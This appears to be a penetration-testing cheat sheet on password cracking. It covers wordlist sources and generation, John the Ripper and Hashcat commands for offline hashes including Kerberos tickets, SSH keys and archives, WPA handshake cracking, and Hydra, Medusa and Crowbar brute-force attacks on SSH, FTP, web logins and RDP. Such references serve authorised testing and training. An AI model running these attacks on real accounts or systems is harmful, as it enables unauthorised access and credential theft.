<summary>Cracking Hashes Offline</summary>

+ <details>
    <summary>Wordlists</summary>

    + 
        <br></br>
        <b>Local Wordlists</b>

        ```
        /usr/share/wordlists
        ```

        <b>SecLists</b>

        ```
        apt install seclists
        ```
        ```
        https://github.com/danielmiessler/SecLists/tree/master/Usernames
        ```
        ```
        https://github.com/danielmiessler/SecLists/tree/master/Passwords
        ```

        <b>Have I been Pwned</b>

        ```
        https://haveibeenpwned.com/Passwords
        ```

        <b>CrackStations Dictionary List</b>

        ```
        https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
        ```

        <b>Rainbow Tables (Rainbow Crack)</b>

        ```
        http://project-rainbowcrack.com/table.htm
        ```

        <b>Rocktastics Mega Wordlist</b>

        ```
        https://labs.nettitude.com/tools/rocktastic/
        ```

        <b>berzerk0 Wordlist</b>

        ```
        https://www.hack3r.com/forum-topic/wikipedia-wordlist
        ```

        <b>Weakpass</b>

        ```
        https://www.hack3r.com/forum-topic/wikipedia-wordlist
        ```

        <b>Tools</b>

        <b>Crunch: Create custom word list based on pattern</b>
        <li>Password Policy pattern example</li>
        <li>[Capital Letter][2x Lowercase Letters][2x Special Chars] [3x Numeric]</li>
        
        ```
        crunch 8 8 -t ,@@^^%%%
        ```
    
        <li><b>@</b>Lower case alpha characters</li>
        <li><b>,</b>Upper case alpha characters</li>
        <li><b>%</b>Numeric characters</li>
        <li><b>^</b>Special characters including space</li>
    
        <b>Crunch: Password with 4 to 6 characters with only the listed characters</b>
    
        ```
        crunch 4 6 0123456789ABCDEF -o crunch.txt
        ```
    
        <b>Crunch: Predefined charactersets with all upercase and lowercase letters</b>
    
        ```
        crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
        ```
 
        <b>cewl: Scrape site for keywords</b>
        
        ```
        cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
        ```
        
        <li><b>-m 6</b>: Words with 6 characters or more</li>

        <br></br>
    </details>

    <details>
    <summary>John The Ripper</summary>

    + 
        <br></br>
        <b>Customize Jack the ripper Rules from file:</b>
        
        ```
        sudo vim /etc/john/john.conf 
        ```
        
        <b>Add the following to line 979 or variation depending on what you want to accomplish</b>
        
        ```
        # Add two numbers to the end of each password
        $[0-9]$[0-9]
        ```
        ```
        $[%^&*()_+\-={}|\[\]\\;':",./\<\>?`~]
        ```
        
        <b>Rule Based Attack</b>
        
        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout > mutated.txt
        ```
        
        <b>DICTIONARY ATTACK</b>

        ```
        john --format=[Type] --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
        ```

        <b>BruteForce Attack</b>

        ```
        john --format=[Type] hash. txt
        ```

        <b>Mask Attack</b>

        ```
        john --format=[Type] --mask=?l?l?l?l?l?l hash.txt -min-len=6
        ```

        <b>Incremental Attack</b>

        ```
        john --incremental hash.txt
        ```

        <b>Dictionary + Rules Attack</b>

        ```
        john --format=[Type] --wordlist=/usr/share/wordlists/rockyou.txt
        ```

        <b>Benchmark Test</b>

        ```
        john --test
        ```

        <b>Session Name</b>

        ```
        john hash.txt --session=example_name
        ```

        <b>Session Restore</b>

        ```
        john --restore=example_name
        ```

        <b>Show Cracked Results</b>

        ```
        john hash.txt --pot= <john potfile="">--show</john>
        ```

        <b>Word List Generation</b>

        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt --stdout --external:[filter name] > out.txt
        ```

        <b>Cracking SSH Keys</b>

        ```
        /usr/share/john/ssh2john.py id_rsa > hash.john
        ```
        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt hash.john
        ```

        <b>Cracking KRB5TGS Keys</b>

        ```
        john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt krb-key.txt
        ```

        <b>Cracking ASREP Keys</b>

        ```
        john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep-key.txt
        ```
        
        <b>Cracking Zips and Rars</b>
        
        ```
        ./zip2john ../[FILE].zip > ../zip.hashes
        ```
        ```
        ./rar2john ../[FILE].rar > ../rar.hashes
        ```
        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt rar.hashes
        ```
        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt zip.hashes
        ```

        <br></br>
    </details>

    <details>
    <summary>Hashcat</summary>

    + 
        <br></br>
        <b>Benchmark Test (Hash Type)</b>

        ```
        hashcat -b -m #type
        ```

        <b>Show Example Hash</b>

        ```
        hashcat -m #type --example-hashes
        ```

        <b>Dictionary Attack</b>

        ```
        hashcat -a 0 -m #type hash.txt dict.txt
        ```

        <b>Dictionary + Rules Attack</b>

        ```
        hashcat -a 0 -m #type hash.txt dict.txt -r rule.txt
        ```

        <b>Combination Attack</b>

        ```
        hashcat -a 1 -m #type hash.txt dict1.txt dict2.txt
        ```

        <b>Mask Attack</b>

        ```
        hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a
        ```

        <b>Hybrid Dictionary + Mask</b>

        ```
        hashcat -a 6 -m #type hash.txt dict.txt ?a?a?a?a
        ```

        <b>Hybrid Mask + Dictionary</b>

        ```
        hashcat -a 7 -m #type hash.txt ?a?a?a?a dict.txt
        ```

        <b>Default Increment</b>

        ```
        hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment
        ```

        <b>Increment Minimum Length</b>

        ```
        hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment-min=4
        ```

        <b>Increment Max Length</b>

        ```
        hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a --increment-max=5
        ```

        <b>Session Restore</b>

        ```
        hashcat -a 0 -m #type --restore --session <uniq_name> hash.txt dict.txt

        ```

        <b>Cracking krb5ts Keys</b>

        ```
        hashcat -m 13100 --force <TGSs_file> <passwords_file>

        ```

        <b>Cracking Asrep keys</b>

        ```
        hashcat -a 0 -m 18200 <asrep_file> <password_file>

        ```

        <br></br>
    </details>

    <details>
    <summary>Cracking WEP/WPA/WPA 2PSK Authentication</summary>

    + 
        <br></br>
        <b>Cracking Handshake with Aircrack</b>

        ```
        aircrack-ng -w /usr/share/wordlist/fasttrack.txt 0001.cap
        ```

        <br></br>
        <b>Cracking Handshake with Hashcat</b>

        ```
        hashcat.exe -m 2500 capture.hccapx rockyou.txt (Dictionary Attack)
        ```
        ```
        hashcat.exe -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d (Brute-Force)
        ```
        ```
        hashcat.exe -m 2500 -r rules/best64.rule capture.hccapx rockyou.txt (Rule-Based)
        ```

        <br></br>
        <b>Cracking Handshake with John The Ripper</b>

        ```
        hpccap2john
        ```
        ```
        john --format=wpapsk --wordlist=/usr/share/wordlists/rockyou.txt crackmecap
        ```
        ```
        john --format=wpapsk-opencl --wordlist=/usr/share/wordlists/rockyou.txt crackmecap
        ```



        <br></br>
        <b>Other Resources</b>

        ```
        https://github.com/lgandx/PCredz
        ```

        <br></br>
    </details>
</details>
</details>

<details>
<summary>Cracking Hashes Online</summary>

+ <details>
    <summary>Medusa</summary>

    + 
        <br></br>

        ```
        medusa -h target-ip -u [username] -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/[Directory]
        ```
        ```    
        medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ftp
        ```
        ```    
        medusa -H hosts.txt -U [path to username file] -P [path to password file] -M http -m DIR:/[Directory]
        ```
        ```    
        medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ssh -n 2222
        ```
        ```    
        medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ftp -O log.txt

        ```

        <br></br>
    </details>

    <details>
    <summary>Hydra</summary>

    + 
        <br></br>
        <b>Hyda SSH attack</b>

        ```
        hydra -l user -P pass.txt -t 10 x.x.x.x ssh -s 22
        ```
        ```
        hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t x.x.x.x ssh -s 22
        ```
        ```
        hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://x.x.x.x
        ```
        
        <b>HTTP POST Attack</b>
        <li>View Page Source of Login page to get parameters</li>
        
        ```
        <form name="...." method="post" action="[URL_Fed_to_Hydra]">
        <p>Login: <input type="text" name="[User_Param_Fed_to_Hydra]" /></p>
        <p>Password: <input type="password" name="[Password_Param_Fed_to_Hydra]" /></p>
        ```
        
        <li>View Error of Failed Login</li>
        
        
        <b>Hydra HTTP Post Template</b>        
        
        ```
        hydra x.x.x.x http-form-post "[Directory]/[URL_Fed_to_Hydra]:[User_Param_Fed_to_Hydra]=^USER^&[Password_Param_Fed_to_Hydra]=^PASS^:[Invalid_Login_Error_Message]" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
        ```
        
        <b>Other Example</b>
        
        ```    
        hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Crowbar</summary>

    + 
        <br></br>
        <b>Install Crowbar</b>

        ```
        sudo apt install crowbar
        ```
        
        <b>Crowbar for RDP credentials: RDP does not handle multiple threads so use 1</b>
        
        ```
        crowbar -b rdp -s x.x.x.x/32 -u admin -C password.txt -n 1
        ```
       
       <li><b>-b</b> Protocol</li>
       <li><b>-s</b> Target Server</li>
       <li><b>-u</b> User</li>
       <li><b>-C</b> Wordlist</li>
       <li><b>-n</b> Number of Threads</li>
        
        <br></br>
    </details>
</details>
